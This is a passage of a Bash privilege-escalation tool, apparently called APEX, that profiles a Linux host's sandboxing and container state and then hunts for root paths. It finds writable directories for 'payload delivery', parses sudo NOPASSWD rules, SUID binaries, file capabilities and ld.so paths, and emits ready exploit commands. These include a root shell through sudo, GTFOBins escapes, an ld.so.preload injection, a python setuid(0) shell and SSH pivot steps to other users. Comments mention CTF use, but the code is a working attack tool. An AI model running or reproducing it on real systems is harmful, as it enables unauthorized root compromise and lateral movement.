            0) SELINUX_STATUS="Permissive" ;;
            *) SELINUX_STATUS="Unknown"    ;;
        esac
    elif [ -d /sys/fs/selinux ]; then
        SELINUX_STATUS="Permissive"
    else
        SELINUX_STATUS="Disabled"
    fi

    # ── AppArmor ────────────────────────────────────────────────────────────
    # Prefer filesystem indicators — aa-status often needs root and gives no
    # stdout (only exit code) which safe_run() intentionally discards.
    if [ -d /sys/kernel/security/apparmor ]; then
        APPARMOR_STATUS="Enabled"
        # NOTE: profiles file has mode 444 but kernel rejects non-root reads —
        # [ -r ] looks at mode bits only, so the shell redirect can still fail.
        # Brace-group 2>/dev/null catches the shell-side open() error.
        local nprofiles
        nprofiles=$({ wc -l < /sys/kernel/security/apparmor/profiles; } 2>/dev/null | tr -d ' ')
        case "$nprofiles" in
            ''|*[!0-9]*) : ;;  # empty (permission denied) or non-numeric: leave status as-is
            0) : ;;
            *) APPARMOR_STATUS="Enabled (${nprofiles} profiles)" ;;
        esac
    elif [ -r /sys/module/apparmor/parameters/enabled ]; then
        local en
        en=$({ cat /sys/module/apparmor/parameters/enabled; } 2>/dev/null)
        case "$en" in
            Y) APPARMOR_STATUS="Enabled"  ;;
            *) APPARMOR_STATUS="Disabled" ;;
        esac
    else
        APPARMOR_STATUS="Disabled"
    fi

    # ── Seccomp ─────────────────────────────────────────────────────────────
    # /proc/self/status Seccomp field: 0=disabled, 1=strict, 2=filter.
    # When we're under a filter (mode 2) it means a parent installed seccomp-bpf
    # — most container runtimes do this. Worth noting because it limits syscalls.
    if [ -r /proc/self/status ]; then
        local sec
        sec=$(awk '/^Seccomp:/{print $2; exit}' /proc/self/status 2>/dev/null)
        case "${sec:-0}" in
            0) SECCOMP_STATUS="Disabled" ;;
            1) SECCOMP_STATUS="Strict"   ;;
            2) SECCOMP_STATUS="Filter"   ;;
            *) SECCOMP_STATUS="Unknown"  ;;
        esac
    else
        SECCOMP_STATUS="Unknown"
    fi
    return 0
}
# ─── detect_container ───────────────────────────────────────────────────────
# Sets IS_CONTAINER=1 + CONTAINER_TYPE if ANY of these are true:
#   1. /proc/self/ns/pid inode differs from /proc/1/ns/pid (different ns)
#   2. /proc/self/status NSpid line has more than one number (nested)
#   3. /proc/1/cgroup mentions docker/lxc/kubepods/podman/containerd
#   4. /.dockerenv or /run/.containerenv marker file exists
#   5. /proc/self/mounts shows overlay or aufs filesystem
# Multiple methods because makers can scrub any single one (CRITICAL-paranoid mode).
detect_container() {
    IS_CONTAINER=0
    CONTAINER_TYPE="none"

    # ── Method 1: namespace inode comparison ────────────────────────────────
    # Cannot be faked — the kernel exposes the actual namespace inode. If we
    # have access to /proc/1/ns/pid (sometimes restricted), divergence is proof.
    local self_pid_ns init_pid_ns
    self_pid_ns=$(readlink /proc/self/ns/pid 2>/dev/null)
    init_pid_ns=$(readlink /proc/1/ns/pid 2>/dev/null)
    if [ -n "$self_pid_ns" ] && [ -n "$init_pid_ns" ] \
       && [ "$self_pid_ns" != "$init_pid_ns" ]; then
        IS_CONTAINER=1
        CONTAINER_TYPE="ns-divergence"
    fi

    # ── Method 2: NSpid field shows nested namespace ────────────────────────
    # /proc/self/status NSpid: line has N+1 numbers when nested N levels deep.
    local nspid_fields
    nspid_fields=$(awk '/^NSpid:/{print NF-1; exit}' /proc/self/status 2>/dev/null)
    if [ "${nspid_fields:-1}" -gt 1 ]; then
        IS_CONTAINER=1
        [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="nspid-nested"
    fi

    # ── Method 3: cgroup line in /proc/1/cgroup ─────────────────────────────
    if [ -r /proc/1/cgroup ]; then
        local cg
        cg=$({ cat /proc/1/cgroup; } 2>/dev/null)
        case "$cg" in
            *docker*)     IS_CONTAINER=1; [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="docker"     ;;
            *kubepods*)   IS_CONTAINER=1; [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="kubernetes" ;;
            *lxc*)        IS_CONTAINER=1; [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="lxc"        ;;
            *podman*)     IS_CONTAINER=1; [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="podman"     ;;
            *containerd*) IS_CONTAINER=1; [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="containerd" ;;
        esac
    fi

    # ── Method 4: marker files ──────────────────────────────────────────────
    if [ -f /.dockerenv ]; then
        IS_CONTAINER=1
        [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="docker"
    fi
    if [ -f /run/.containerenv ]; then
        IS_CONTAINER=1
        [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="podman"
    fi

    # ── Method 5: overlay / aufs mount on / ─────────────────────────────────
    if [ -r /proc/self/mounts ]; then
        if grep -qE '^(overlay|aufs) ' /proc/self/mounts 2>/dev/null; then
            IS_CONTAINER=1
            [ "$CONTAINER_TYPE" = "none" ] && CONTAINER_TYPE="overlay-fs"
        fi
    fi
    return 0
}
# ─── detect_resources ───────────────────────────────────────────────────────
# Populates MEM_KB, FORK_LIMIT, DISK_FREE_KB. Used later to decide whether
# heavy passes (debsums, getcap -r /) are safe to run.
detect_resources() {
    # ── Memory ──────────────────────────────────────────────────────────────
    MEM_KB=0
    if [ -r /proc/meminfo ]; then
        MEM_KB=$(awk '/^MemTotal:/{print $2; exit}' /proc/meminfo 2>/dev/null)
    fi
    case "$MEM_KB" in ''|*[!0-9]*) MEM_KB=0 ;; esac

    # ── Fork limit (per-user RLIMIT_NPROC) ──────────────────────────────────
    FORK_LIMIT=$(ulimit -u 2>/dev/null)
    case "$FORK_LIMIT" in
        unlimited)   FORK_LIMIT=999999 ;;
        ''|*[!0-9]*) FORK_LIMIT=0      ;;
    esac

    # ── Disk free on /tmp (kB blocks, POSIX -P prevents wrapped output) ─────
    DISK_FREE_KB=0
    local df_out
    df_out=$(safe_run 3 df -kP /tmp)
    if [ -n "$df_out" ]; then
        DISK_FREE_KB=$(printf '%s' "$df_out" | awk 'NR==2{print $4; exit}')
    fi
    case "$DISK_FREE_KB" in ''|*[!0-9]*) DISK_FREE_KB=0 ;; esac
    return 0
}
# ─── detect_execution_primitives ────────────────────────────────────────────
# Finds:
#   EXEC_DIR    — first writable+exec directory (RAM-backed preferred)
#   EXEC_METHOD — best available payload delivery channel
#
# Order of preference for EXEC_DIR: /dev/shm > /tmp > /var/tmp > /run/user/UID > $HOME > /dev
# Order of preference for EXEC_METHOD:
#   binary:<dir>     (writable + noexec=off — direct ELF or shell payload)
#   python3_inline   (-c "...")     | python2_inline
#   perl_inline      (-e "...")     | ruby_inline | node_inline | lua_inline
#   none             (only manual instructions can be produced)
detect_execution_primitives() {
    EXEC_DIR=""
    EXEC_METHOD="none"

    local dir testfile out
    for dir in /dev/shm /tmp /var/tmp "/run/user/${APEX_UID:-0}" "${HOME:-/root}" /dev; do
        [ -d "$dir" ] || continue
        [ -w "$dir" ] || continue

        testfile="${dir}/.apex_xtest_$$_${RANDOM:-0}"
        # Single quotes so $$ reaches the file unexpanded; inner shell expands it.
        printf '%s\n' '#!/bin/sh' 'echo APEX_XOK_$$' >"$testfile" 2>/dev/null || continue
        chmod +x "$testfile" 2>/dev/null

        out=$(safe_run 3 "$testfile")
        rm -f -- "$testfile" 2>/dev/null

        case "$out" in
            APEX_XOK_*)
                EXEC_DIR="$dir"
                break
                ;;
        esac
    done

    if [ -n "$EXEC_DIR" ]; then
        EXEC_METHOD="binary:${EXEC_DIR}"
    elif [ "$HAS_PYTHON3" = "1" ]; then
        EXEC_METHOD="python3_inline"
    elif [ "$HAS_PYTHON2" = "1" ]; then
        EXEC_METHOD="python2_inline"
    elif [ "$HAS_PERL" = "1" ]; then
        EXEC_METHOD="perl_inline"
    elif [ "$HAS_RUBY" = "1" ]; then
        EXEC_METHOD="ruby_inline"
    elif [ "$HAS_NODE" = "1" ]; then
        EXEC_METHOD="node_inline"
    elif [ "$HAS_LUA" = "1" ]; then
        EXEC_METHOD="lua_inline"
    fi
    return 0
}
detect_restricted_shell() {
    RESTRICTED=0
    RESTRICTED_REASONS=""
    SHELL_NAME=""
    SHELL_PATH=""

    # Resolve invoking shell. $0 of *this* script is apex.sh, so use parent.
    # $SHELL env is the login shell — usually accurate; cross-check with /proc.
    local s
    s="${SHELL:-}"
    SHELL_PATH="$s"
    case "$s" in
        */*) SHELL_NAME="${s##*/}" ;;
        *)   SHELL_NAME="$s" ;;
    esac

    # Name-based heuristic — restricted shells advertise themselves.
    case "$SHELL_NAME" in
        rbash|rksh|rksh93|rzsh|rsh|rush)
            RESTRICTED=1
            RESTRICTED_REASONS="${RESTRICTED_REASONS}name:${SHELL_NAME};"
            ;;
    esac

    # bash sets $- to contain "r" when invoked restricted (rbash or bash -r).
    case "$-" in *r*)
        RESTRICTED=1
        RESTRICTED_REASONS="${RESTRICTED_REASONS}dollarflags:r;"
        ;;
    esac

    # /proc/$PPID/comm — the actual parent process executable name.
    if [ -r "/proc/$PPID/comm" ]; then
        local pcomm
        pcomm=$({ cat "/proc/$PPID/comm"; } 2>/dev/null)
        case "$pcomm" in
            rbash|rksh|rzsh|rsh|rush)
                RESTRICTED=1
                RESTRICTED_REASONS="${RESTRICTED_REASONS}ppidcomm:${pcomm};"
                ;;
        esac
    fi

    # Behavioural probe — restricted shells block PATH assignment, cd,
    # output redirection, and slash-containing command names. We test each
    # in a fresh subshell so failures don't poison the current environment.
    # Test 1: PATH assignment (rbash rejects).
    if [ -n "$SHELL_PATH" ] && [ -x "$SHELL_PATH" ]; then
        local probe
        probe=$(safe_run 2 "$SHELL_PATH" -c 'PATH=/tmp; echo OK' 2>/dev/null)
        case "$probe" in
            *OK*) : ;;
            *)
                RESTRICTED=1
                RESTRICTED_REASONS="${RESTRICTED_REASONS}probe:PATH_assign_blocked;"
                ;;
        esac
        # Test 2: cd
        probe=$(safe_run 2 "$SHELL_PATH" -c 'cd / 2>/dev/null && echo OK' 2>/dev/null)
        case "$probe" in
            *OK*) : ;;
            *)
                RESTRICTED=1
                RESTRICTED_REASONS="${RESTRICTED_REASONS}probe:cd_blocked;"
                ;;
        esac
        # Test 3: slash-containing command name (rbash rejects /bin/echo).
        probe=$(safe_run 2 "$SHELL_PATH" -c '/bin/echo OK' 2>/dev/null)
        case "$probe" in
            *OK*) : ;;
            *)
                RESTRICTED=1
                RESTRICTED_REASONS="${RESTRICTED_REASONS}probe:slash_cmd_blocked;"
                ;;
        esac
    fi

    return 0
}


# =============================================================================
# SECTION 5 — Engine 1: Mapper (Breadth Scanners, Run in Parallel)
# =============================================================================
# Each map_* function is independent and writes findings to its own atomic
# file in APEX_FINDINGS_DIR. No shared state, no append races. CRITICAL-2.

map_sudo() {
    # CRITICAL-1: array args for safe_run. CRITICAL-5: multi-line / continuation
    # rules. Also: env_keep / SETENV / wildcard / NOPASSWD extraction. /etc/sudoers
    # readable fallback. Group-based rules cross-referenced with our groups.

    command -v sudo >/dev/null 2>&1 || return 0

    # ── sudo -n -l (non-interactive — never hangs) ────────────────────────────
    local sudol joined
    sudol=$(safe_run 5 sudo -n -l 2>/dev/null)

    if [ -n "$sudol" ]; then
        # Join continuation lines: any line that starts with whitespace is
        # part of the previous rule. awk merges them into a single record.
        joined=$(printf '%s\n' "$sudol" | awk '
            /^[[:space:]]/ { printf " %s", $0; next }
            NR>1 { print "" }
            { printf "%s", $0 }
            END { print "" }
        ')

        # NOPASSWD rules → CONFIRMED root path (95).
        printf '%s\n' "$joined" | grep -i "NOPASSWD" | while IFS= read -r rule; do
            # Strip leading "(runas)" specifier so the command list is the rest.
            local cmdlist
            cmdlist=$(printf '%s' "$rule" | sed 's/.*NOPASSWD:[[:space:]]*//I')
            # Split on commas, then per-command path extraction.
            printf '%s' "$cmdlist" | tr ',' '\n' | while IFS= read -r cmd; do
                cmd=$(printf '%s' "$cmd" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
                [ -z "$cmd" ] && continue
                # ALL rule = unrestricted NOPASSWD = instant root.
                case "$cmd" in
                    ALL|\(ALL\)*|\(ALL\ :\ ALL\)*)
                        register_finding "SUDO_ALL_NOPASSWD" "ALL" \
                            "sudo -n NOPASSWD: ALL — run any command as root" \
                            99 "sudo"
                        register_exploit "SUDO_ALL_NOPASSWD" "ALL" \
                            "sudo -n /bin/bash"
                        continue
                        ;;
                esac
                # Wildcard in path = high value, may need sudoedit-style abuse.
                case "$cmd" in
                    *\**)
                        register_finding "SUDO_NOPASSWD_WILDCARD" "$cmd" \
                            "sudo NOPASSWD with wildcard: $cmd" 90 "sudo"
                        ;;
                    *)
                        # Extract bare path (drop arguments) and basename for GTFO lookup.
                        local _bin_path _bin_base _gtfo_body
                        _bin_path=$(printf '%s' "$cmd" | awk '{print $1}')
                        _bin_base=$(basename "$_bin_path" 2>/dev/null)
                        _gtfo_body=$(_gtfo_payload "$_bin_base" sudo "$_bin_path" 2>/dev/null)
                        if [ -n "$_gtfo_body" ]; then
                            register_finding "SUDO_NOPASSWD_GTFO" "$cmd" \
                                "sudo NOPASSWD: $cmd — known GTFOBins escape ($_bin_base)" \
                                95 "sudo"
                            register_exploit "SUDO_NOPASSWD_GTFO" "$cmd" "$_gtfo_body"
                        else
                            register_finding "SUDO_NOPASSWD" "$cmd" \
                                "sudo NOPASSWD: $cmd" 92 "sudo"
                            register_exploit "SUDO_NOPASSWD" "$cmd" \
                                "sudo -n $cmd"
                        fi
                        ;;
                esac
            done
        done

        # env_keep — may allow LD_PRELOAD / PYTHONPATH propagation.
        printf '%s\n' "$joined" | grep -iE "env_keep|setenv" | while IFS= read -r line; do
            register_finding "SUDO_ENV_KEEP" "sudoers" \
                "sudoers env_keep/SETENV present: $(printf '%s' "$line" | tr -s ' ')" \
                70 "sudo"
        done

        # Password-required ALL rules — useful if we already have the password.
        printf '%s\n' "$joined" | grep -v -i "NOPASSWD" | \
            grep -E '\(ALL\)|\(ALL : ALL\)|\(root\)' | grep -E ' ALL($|[^_])' | \
            while IFS= read -r line; do
                register_finding "SUDO_PASSWD_ALL" "ALL" \
                    "sudo ALL with password: $line — needs current password" \
                    75 "sudo"
            done
    fi

    # ── /etc/sudoers readable fallback (MEDIUM-8) ─────────────────────────────
    # If we can read /etc/sudoers and /etc/sudoers.d/*, parse for ALL users'
    # rules (lateral movement hints) + Cmnd_Alias resolution.
    local sf
    for sf in /etc/sudoers /etc/sudoers.d/*; do
        [ -r "$sf" ] || continue
        # Skip backup/temp files
        case "$sf" in *.bak|*~|*.swp) continue ;; esac
        # NOPASSWD rules in readable file = high-confidence read.
        grep -E "NOPASSWD" "$sf" 2>/dev/null | while IFS= read -r line; do
            line=$(printf '%s' "$line" | sed 's/^[[:space:]]*//')
            case "$line" in
                \#*) continue ;;
            esac
            register_finding "SUDOERS_FILE_NOPASSWD" "$sf" \
                "sudoers rule: $line" 60 "sudo"
        done
        # Cmnd_Alias = aliased command lists worth resolving.
        grep -E "^Cmnd_Alias" "$sf" 2>/dev/null | while IFS= read -r line; do
            register_finding "SUDOERS_CMND_ALIAS" "$sf" \
                "$line" 50 "sudo"
        done
    done

    return 0
}
map_suid_sgid() {
    # apex_find for SUID/SGID. For each binary: strings analysis (PATH-relative
    # cmds = highest value), RPATH check, ld.so.conf.d/ writable dirs (HIGH-2).
    # gtfobins-style known abusable binaries get a confidence bump.

    # ── Well-known abusable SUID binaries (gtfobins subset) ──────────────────
    # If any of these appear in find output, raise confidence to 90.
    local GTFO_SUID="nmap|vim|find|bash|sh|less|more|nano|cp|mv|awk|gawk|env|python|python3|perl|ruby|node|lua|tar|zip|tee|dd|man|expect|ftp|gdb|gimp|ionice|jjs|lua|nice|nohup|pip|rlwrap|rsync|run-mailcap|setarch|socat|stdbuf|strace|time|timeout|watch|xargs|busybox"

    # ── Find SUID + SGID binaries system-wide ─────────────────────────────────
    local suid_list
    suid_list=$(safe_run 30 apex_find / -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null)

    [ -z "$suid_list" ] && return 0

    # Current user's supplementary groups (for group-execute check)
    local _my_groups
    _my_groups=$(id -Gn 2>/dev/null | tr ' ' '\n')

    printf '%s\n' "$suid_list" | while IFS= read -r bin; do
        [ -f "$bin" ] || continue
        [ -r "$bin" ] || continue
        local base
        base=$(basename "$bin")

        # D7: Check if current user can actually execute this SUID binary.
        # A SUID binary owned by root with mode 4750 (rwsr-x---) is only
        # executable by the owning group. If we're not in that group, we can't
        # execute it — register at 20% as SUID_LOCKED_NO_EXEC.
        local bin_mode bin_group can_exec
        bin_mode=$(stat -c '%a' "$bin" 2>/dev/null)
        bin_group=$(stat -c '%G' "$bin" 2>/dev/null)
        can_exec="yes"
        # Check other-execute bit (position 0 of 3-digit octal last digit)
        local last_digit="${bin_mode##*[!0-9]}"
        last_digit="${bin_mode%"${bin_mode#???}"}"   # first 3 chars
        last_digit="${bin_mode}"
        # Simpler: use [ -x ] which respects effective UID + groups
        if ! [ -x "$bin" ]; then
            # Not executable by us at all
            can_exec="no"
        elif [ -n "$bin_group" ]; then
            # Check if other-execute bit is clear (group-only exec)
            local octal_other
            octal_other=$(stat -c '%a' "$bin" 2>/dev/null | rev | cut -c1)
            case "${octal_other:-7}" in
                0|1|2|3)
                    # Other has no execute. Check if we're in the owning group.
                    if ! printf '%s\n' "$_my_groups" | grep -qxF "$bin_group"; then
                        can_exec="no"
                    fi
                    ;;
            esac
        fi

        if [ "$can_exec" = "no" ]; then
            # C1 SUID_REACHABLE_LATER — could a *neighbor* user execute this?
            # If the owning group has any non-root members AND we have a
            # readable home dir for one of them, this is a high-value target
            # to revisit after lateral pivot. Surface it loudly.
            local _grp_members _reach_user="" _reach_targets=""
            if [ -n "$bin_group" ] && [ -r /etc/group ]; then
                _grp_members=$(awk -F: -v g="$bin_group" '$1==g{print $4}' /etc/group 2>/dev/null | tr ',' ' ')
                local _gm
                for _gm in $_grp_members; do
                    [ -z "$_gm" ] && continue
                    [ "$_gm" = "$(id -un 2>/dev/null)" ] && continue
                    _reach_targets="$_reach_targets $_gm"
                    [ -d "/home/$_gm" ] && [ -r "/home/$_gm" ] && _reach_user="$_gm"
                done
            fi
            if [ -n "$_reach_targets" ]; then
                register_finding "SUID_REACHABLE_LATER" "$bin" \
                    "SUID $bin runnable only by group $bin_group — pivot to one of:$_reach_targets, then re-run APEX. Manual: getent group $bin_group; ls -la $bin" \
                    72 "suid_lateral"
                register_exploit "SUID_REACHABLE_LATER" "$bin" \
                    "# After pivot to one of:$_reach_targets
ssh -i ~/.ssh/id_rsa <pivot_user>@127.0.0.1 '$bin --help 2>&1 | head -20; strings $bin 2>/dev/null | grep -E \"^(/|[a-z]+\$)\" | head -30'"
            else
                register_finding "SUID_LOCKED_NO_EXEC" "$bin" \
                    "SUID binary $bin (group=$bin_group) — not executable by current user (not in group)" \
                    20 "suid"
            fi
            continue
        fi

        # Known gtfobins binary?
        case "$base" in
            nmap|vim|find|bash|sh|less|more|nano|cp|mv|awk|gawk|env|python|python3|perl|ruby|node|lua|tar|zip|tee|dd|man|expect|gdb|gimp|nice|nohup|pip|rlwrap|rsync|run-mailcap|setarch|socat|stdbuf|strace|time|timeout|watch|xargs|busybox|systemctl|docker|lxc|debugfs|dosbox|ftp|sftp)
                local _suid_gtfo
                _suid_gtfo=$(_gtfo_payload "$base" suid "$bin" 2>/dev/null)
                register_finding "SUID_GTFOBINS" "$bin" \
                    "Known abusable SUID binary: $base — exploit ready" 95 "suid"
                if [ -n "$_suid_gtfo" ]; then
                    register_exploit "SUID_GTFOBINS" "$bin" "$_suid_gtfo"
                else
                    register_exploit "SUID_GTFOBINS" "$bin" \
                        "$bin # consult gtfobins.github.io/gtfobins/$base for exact payload"
                fi
                ;;
            *)
                # Snap-mounted binaries are on read-only squashfs — never injectable.
                case "$bin" in
                    /snap/*)
                        register_finding "SUID_SNAP_SYSTEM" "$bin" \
                            "snap SUID (squashfs, read-only — not injectable): $bin" 15 "suid"
                        continue
                        ;;
                esac
                # B2: package-owned stock binaries (chage, chfn, chsh, expiry,
                # fusermount3, gpasswd, crontab, ...) — almost never the CTF
                # privesc target. Demote to low-confidence informational.
                # Custom paths (/usr/local/, /opt/, /home/, /srv/) bypass the
                # demotion even if a package claims them.
                if ! _in_custom_path "$bin" && _is_pkg_owned "$bin"; then
                    register_finding "SUID_PKG_STOCK" "$bin" \
                        "Stock package-owned SUID (no known abuse path): $bin" \
                        25 "suid"
                else
                    register_finding "SUID_CUSTOM" "$bin" \
                        "Non-standard SUID binary: $bin" 70 "suid"
                fi
                ;;
        esac
        # If we can write to the binary itself: instant.
        if verify_actually_writable "$bin" 2>/dev/null; then
            register_finding "SUID_WRITABLE" "$bin" \
                "CRITICAL: SUID binary is writable — overwrite with payload" \
                99 "suid"
        fi
        # strings analysis — PATH-relative command calls (no leading slash).
        if [ "$HAS_STRINGS" = "1" ]; then
            local strs
            strs=$(safe_run 10 apex_strings "$bin" 2>/dev/null)
            # Look for bare command names that look like commands ("system", "popen")
            # followed by a relative invocation. Cheap heuristic: any function-y
            # token followed by another short word, no slashes.
            printf '%s\n' "$strs" | grep -oE '^[a-z][a-z0-9_-]{1,20}$' 2>/dev/null | \
                sort -u | head -50 | while IFS= read -r tok; do
                case "$tok" in
                    # Common Unix utilities that may be called PATH-relative.
                    ls|cp|mv|rm|cat|chmod|chown|find|grep|awk|sed|tar|wget|curl|nc|netcat|sh|bash|python|python3|perl|ruby|node|service|systemctl|ifconfig|ip|route|ping|sudo|su|mail|sendmail|crontab)
                        # B2: stock package SUID with a "relative command" in
                        # strings is almost always a false-positive — the
                        # binary uses a fixed internal PATH (crontab → /bin/chmod).
                        # Demote unless it lives under a custom tree.
                        local _sr_conf=65
                        if ! _in_custom_path "$bin" && _is_pkg_owned "$bin"; then
                            _sr_conf=20
                        fi
                        register_finding "SUID_STRINGS_RELATIVE" "$bin" \
                            "SUID '$bin' references command '$tok' — PATH hijack candidate" \
                            "$_sr_conf" "suid"
                        ;;
                esac
            done
        fi
        # RPATH / RUNPATH check (HIGH-2).
        if command -v readelf >/dev/null 2>&1; then
            local rpaths
            rpaths=$(safe_run 5 readelf -d "$bin" 2>/dev/null | grep -E 'RPATH|RUNPATH')
            if [ -n "$rpaths" ]; then
                printf '%s\n' "$rpaths" | grep -oE '\[[^]]+\]' | tr -d '[]' | tr ':' '\n' | \
                    while IFS= read -r rdir; do
                        [ -d "$rdir" ] || continue
                        if verify_actually_writable "$rdir" 2>/dev/null; then
                            register_finding "SUID_RPATH_WRITABLE" "$bin" \
                                "RPATH dir writable: $rdir — drop malicious .so" \
                                92 "suid"
                        fi
                    done
            fi
        fi
    done

    # ── /etc/ld.so.conf.d/* writable directories (HIGH-2) ─────────────────────
    local conf
    for conf in /etc/ld.so.conf.d/*; do
        [ -r "$conf" ] || continue
        # Each non-comment line is a library directory.
        grep -v '^#' "$conf" 2>/dev/null | grep -v '^[[:space:]]*$' | \
            while IFS= read -r libdir; do
                libdir=$(printf '%s' "$libdir" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
                [ -d "$libdir" ] || continue
                if verify_actually_writable "$libdir" 2>/dev/null; then
                    register_finding "LD_CONF_DIR_WRITABLE" "$libdir" \
                        "Library dir writable: $libdir (configured in $conf)" \
                        88 "ld_conf"
                fi
            done
    done

    # ── /etc/ld.so.preload (CRITICAL vector) ─────────────────────────────────
    if [ -f /etc/ld.so.preload ]; then
        if verify_actually_writable /etc/ld.so.preload 2>/dev/null; then
            register_finding "LD_PRELOAD_FILE" "/etc/ld.so.preload" \
                "CRITICAL: /etc/ld.so.preload writable — injects into every process" \
                99 "ld_preload"
            register_exploit "LD_PRELOAD_FILE" "/etc/ld.so.preload" \
                "echo /path/to/payload.so > /etc/ld.so.preload"
        fi
    elif [ -w / ] || [ -w /etc ]; then
        # We can CREATE /etc/ld.so.preload — same vector.
        if verify_actually_writable /etc 2>/dev/null; then
            register_finding "LD_PRELOAD_CREATE" "/etc" \
                "CRITICAL: /etc writable — create /etc/ld.so.preload" \
                95 "ld_preload"
        fi
    fi

    # Silence shellcheck about unused-here GTFO_SUID — kept for future use.
    : "$GTFO_SUID"

    return 0
}
map_capabilities() {
    # getcap recursive (preferred, identifies file capabilities). Fallback:
    # parse /proc/*/status CapEff with proper bitwise decode (MEDIUM-2).

    # ── File capabilities via getcap ──────────────────────────────────────────
    if command -v getcap >/dev/null 2>&1; then
        local capout
        capout=$(apex_getcaps 2>/dev/null)
        printf '%s\n' "$capout" | grep -v '^$' | while IFS= read -r line; do
            # Format: "/path/to/binary cap_xxx,cap_yyy=ep"
            local bin caps
            bin=$(printf '%s' "$line" | awk '{print $1}')
            caps=$(printf '%s' "$line" | awk '{for(i=2;i<=NF;i++) printf "%s ", $i}')
            [ -f "$bin" ] || continue

            # Snap confinement binaries: snap-confine and snap-update-ns have many
            # capabilities BY DESIGN as part of the snapd confinement system.
            # They run setuid-root and are managed by snapd — not user-exploitable.
            case "$bin" in
                /snap/*/snap-confine|/snap/*/snap-update-ns|*/snapd/snap-confine|*/snapd/snap-update-ns)
                    continue ;;
            esac
            case "$(basename "$bin")" in
                snap-confine|snap-update-ns) continue ;;
            esac

            # D8: SAFE_CAPS whitelist — benign capabilities used by ping/mtr/etc.
            # These are expected on a normal system and not exploitable.
            local base_bin
            base_bin=$(basename "$bin")
            case "$caps" in
                *cap_net_raw*|*cap_net_bind_service*|*cap_net_broadcast*|*cap_net_admin*)
                    # Only truly dangerous if combined with other dangerous caps.
                    case "$caps" in
                        *cap_setuid*|*cap_sys_admin*|*cap_dac*|*cap_chown*|*cap_sys_ptrace*)
                            : # fall through to full analysis below
                            ;;
                        *)
                            # Pure networking cap — only interesting for lateral
                            # movement, not local privesc. Low confidence.
                            case "$base_bin" in
                                ping|ping6|mtr|mtr-packet|traceroute|tcpdump|dumpcap|arping)
                                    # Expected — these are intentionally granted. Skip.
                                    continue
                                    ;;
                            esac
                            register_finding "CAP_NET_SAFE" "$bin" \
                                "Networking cap only (not directly exploitable for LPE): $bin $caps" \
                                15 "capabilities"
                            continue
                            ;;
                    esac
                    ;;
            esac

            # DANGER_CAPS — high-value capabilities
            case "$caps" in
                *cap_setuid*|*cap_setgid*)
                    register_finding "CAP_SETUID" "$bin" \
                        "Binary has CAP_SETUID/SETGID: $caps — setuid(0) possible" \
                        90 "capabilities"
                    register_exploit "CAP_SETUID" "$bin" \
                        "$bin (consult gtfobins for capability exploit, e.g. python3 -c 'import os;os.setuid(0);os.system(\"/bin/sh\")')"
                    ;;
                *cap_sys_admin*)
                    register_finding "CAP_SYS_ADMIN" "$bin" \
                        "Binary has CAP_SYS_ADMIN: $caps — near-root capability" \
                        92 "capabilities"
                    ;;
                *cap_sys_ptrace*)
                    register_finding "CAP_SYS_PTRACE" "$bin" \
                        "Binary has CAP_SYS_PTRACE: $caps — process injection possible" \
                        85 "capabilities"
                    ;;
                *cap_dac_read_search*|*cap_dac_override*)
                    register_finding "CAP_DAC" "$bin" \
                        "Binary has CAP_DAC_* : $caps — bypass file permissions" \
                        85 "capabilities"
                    ;;
                *cap_chown*)
                    register_finding "CAP_CHOWN" "$bin" \
                        "Binary has CAP_CHOWN: $caps — chown arbitrary files" \
                        80 "capabilities"
                    ;;
                *cap_sys_rawio*|*cap_mknod*)
                    register_finding "CAP_RAWIO" "$bin" \
                        "Binary has CAP_SYS_RAWIO/MKNOD: $caps — raw device access" \
                        80 "capabilities"
                    ;;
                *cap_net_raw*|*cap_net_admin*)
                    register_finding "CAP_NET" "$bin" \
                        "Binary has CAP_NET_*: $caps — raw socket / interface control" \
                        65 "capabilities"
                    ;;
                *)
                    register_finding "CAP_OTHER" "$bin" \
                        "Binary has capabilities: $caps" 60 "capabilities"
                    ;;
            esac
        done
    fi

    # ── Process capabilities via /proc/*/status (CapEff bitwise) ──────────────
    # CAP bit positions per linux/capability.h
    # 0=CHOWN 1=DAC_OVERRIDE 2=DAC_READ_SEARCH 6=SETGID 7=SETUID 12=NET_ADMIN
    # 13=NET_RAW 19=SYS_PTRACE 21=SYS_ADMIN
    local pdir pid uid status capeff
    for pdir in /proc/[0-9]*/; do
        pid="${pdir%/}"; pid="${pid##*/}"
        status="${pdir}status"
        [ -r "$status" ] || continue
        uid=$(awk '/^Uid:/{print $2; exit}' "$status" 2>/dev/null)
        # Skip uid=0 processes (we expect root to have caps). Focus on
        # non-root processes that nevertheless have powerful caps.
        case "$uid" in 0|'') continue ;; esac
        # B1: skip same-uid pids — own session has no privesc value.
        # Example: operator runs `su layne.stanley` from a root shell to
        # demo recon; that process shows up with our uid + inherited caps.
        [ "$uid" = "${APEX_UID:-X}" ] && continue
        capeff=$(awk '/^CapEff:/{print $2; exit}' "$status" 2>/dev/null)
        [ -z "$capeff" ] && continue
        case "$capeff" in '0000000000000000'|0) continue ;; esac
        # Bitwise decode — only attempt if bash supports $((16#...)).
        if [ "$HAS_BASH" = "1" ]; then
            local cap_dec
            # Handle leading zeros — bash $((16#...)) treats 0xNNN as hex.
            cap_dec=$((16#${capeff}))
            local cmd uname_t=""
            cmd=$(tr '\0' ' ' < "${pdir}cmdline" 2>/dev/null | cut -c1-120)
            # B1: resolve target uid → username via /etc/passwd if readable
            if [ -r /etc/passwd ]; then
                uname_t=$(awk -F: -v u="$uid" '$3==u{print $1; exit}' /etc/passwd 2>/dev/null)
            fi
            local uid_label="uid=$uid"
            [ -n "$uname_t" ] && uid_label="${uname_t}(uid=$uid)"
            if [ $(( cap_dec & (1 << 7) )) -ne 0 ]; then
                register_finding "PROC_CAP_SETUID" "pid:$pid" \
                    "Pid $pid [$uid_label] has CAP_SETUID: $cmd" 80 "capabilities"
            fi
            if [ $(( cap_dec & (1 << 21) )) -ne 0 ]; then
